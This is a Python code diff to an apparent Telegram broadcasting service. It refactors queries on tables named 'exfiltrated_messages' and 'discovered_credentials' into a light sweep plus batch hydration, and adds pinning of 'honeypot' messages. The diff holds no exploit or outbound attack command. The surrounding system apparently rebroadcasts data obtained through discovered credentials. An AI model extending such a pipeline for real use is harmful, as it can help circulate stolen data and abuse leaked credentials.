@@ -236,24 +236,33 @@ def _interleave_by_credential(rows: list[dict[str, Any]], batch_size: int) -> li
 
 
 async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> list[dict[str, Any]]:
-    window = min(max(batch_size * 4, 200), 1000)
-    base_query = (
-        db.table("exfiltrated_messages")
-        .select("*, discovered_credentials!inner(meta)")
-        .eq("is_broadcasted", False)
-        .gte("telegram_msg_id", 0)
-    )
+    """Fetch a light id/credential sweep, interleave it, then hydrate the batch.
 
+    Hydrating only ``batch_size`` rows keeps every query well inside the
+    PostgREST statement timeout; the previous single heavy query timed out
+    (57014) once the sweep window grew.
+    """
+    window = min(max(batch_size * 4, 200), 600)
+
+    def _light():
+        return (
+            db.table("exfiltrated_messages")
+            .select("id,credential_id,telegram_msg_id")
+            .eq("is_broadcasted", False)
+            .gte("telegram_msg_id", 0)
+        )
+
+    rows: list[dict[str, Any]] = []
     if _can_use_broadcast_reliability_columns():
         try:
             response = await async_execute(
-                base_query
+                _light()
                 .or_(f"next_retry_at.is.null,next_retry_at.lte.{now_iso}")
                 .order("telegram_msg_id", desc=False)
                 .limit(window)
             )
             _set_broadcast_reliability_columns_available(True)
-            return _interleave_by_credential(response.data or [], batch_size)
+            rows = response.data or []
         except Exception as exc:
             if not _is_missing_broadcast_reliability_column(exc):
                 raise
@@ -264,15 +273,24 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
                 "to enable retry scheduling."
             )
 
-    response = await async_execute(
+    if not rows:
+        response = await async_execute(
+            _light().order("telegram_msg_id", desc=False).limit(window)
+        )
+        rows = response.data or []
+    if not rows:
+        return []
+
+    selected = _interleave_by_credential(rows, batch_size)
+    ids = [row["id"] for row in selected]
+    hydrated = await async_execute(
         db.table("exfiltrated_messages")
         .select("*, discovered_credentials!inner(meta)")
-        .eq("is_broadcasted", False)
-        .gte("telegram_msg_id", 0)
-        .order("telegram_msg_id", desc=False)
-        .limit(window)
+        .in_("id", ids)
     )
-    return _interleave_by_credential(response.data or [], batch_size)
+    by_id = {row["id"]: row for row in (hydrated.data or [])}
+    return [by_id[row_id] for row_id in ids if row_id in by_id]
+
 
 async def _apply_broadcast_claimed_update(
     msg_id: str,
@@ -902,6 +920,13 @@ async def _broadcast_logic():
                                 local_skipped += 1
                                 continue
                             sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
+                            if sent_message_id and isinstance(msg.get("telegram_msg_id"), int) and msg["telegram_msg_id"] < 0:
+                                try:
+                                    pin_key = f"pin:honeypot:{thread_id}"
+                                    if redis_client.set(pin_key, "1", nx=True, ex=3600):
+                                        await broadcaster.pin_message(group_id, sent_message_id)
+                                except Exception as pin_error:
+                                    logger.debug(f"[Broadcast] honeypot pin skipped: {pin_error}")
                             send_success = True
                             performed_real_send = True
                         except Exception as e:
@@ -934,6 +959,13 @@ async def _broadcast_logic():
                                         local_skipped += 1
                                         continue
                                     sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
+                                    if sent_message_id and isinstance(msg.get("telegram_msg_id"), int) and msg["telegram_msg_id"] < 0:
+                                        try:
+                                            pin_key = f"pin:honeypot:{thread_id}"
+                                            if redis_client.set(pin_key, "1", nx=True, ex=3600):
+                                                await broadcaster.pin_message(group_id, sent_message_id)
+                                        except Exception as pin_error:
+                                            logger.debug(f"[Broadcast] honeypot pin skipped: {pin_error}")
                                     send_success = True
                                 except Exception as retry_e:
                                     logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
